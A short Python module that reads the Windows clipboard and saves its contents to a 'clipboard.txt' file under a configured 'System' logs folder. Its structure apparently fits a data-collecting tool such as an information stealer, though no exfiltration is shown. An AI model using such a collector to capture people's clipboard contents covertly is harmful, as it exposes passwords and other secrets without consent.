from win32clipboard import OpenClipboard, GetClipboardData, CloseClipboard
from os.path import join
from manager.logger import Log
from preferences.config import config

def ClipBoard():
    pathToLogs = join(config.pathToLogs, "System")
    try:
        OpenClipboard()
        data = GetClipboardData()
    except Exception as e:
        Log(f"ClipBoard ---> {e}")
        data = "None"
        
    finally:
        CloseClipboard()
        with open(join(pathToLogs, "clipboard.txt"), 'w', encoding='UTF-8') as f:
            f.write(data)